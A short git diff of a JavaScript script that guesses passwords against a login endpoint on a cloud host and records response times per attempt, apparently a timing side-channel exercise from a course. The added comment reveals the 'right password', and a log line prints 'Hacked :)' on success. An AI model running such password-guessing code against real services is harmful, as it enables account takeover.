@@ -2,7 +2,7 @@ var url = 'https://ec2-54-188-28-123.us-west-2.compute.amazonaws.com:8080/';
 var uname = "au526221";
 
 let startPass = "iiiiiiii";
-let passwdEstimate = "";
+let passwdEstimate = ""; // Right password nagavFub
 
 var tryPromises = [];
 var tryTiming = [];
@@ -28,7 +28,7 @@ function tryPass(startIndex, maxInd, replInd, replMax, passSoFar, maxPassLength)
     body: formData
   }).then(res => {
     if (res.ok) {
-      console.log("Hacked :), password is: ", passSoFar);
+      console.log("Hacked :), password is: ", fuzzyPass);
     }
     tryTiming[startIndex][1].push(new Date().getTime() - startTime);
     if (replInd + 1 < replMax) {
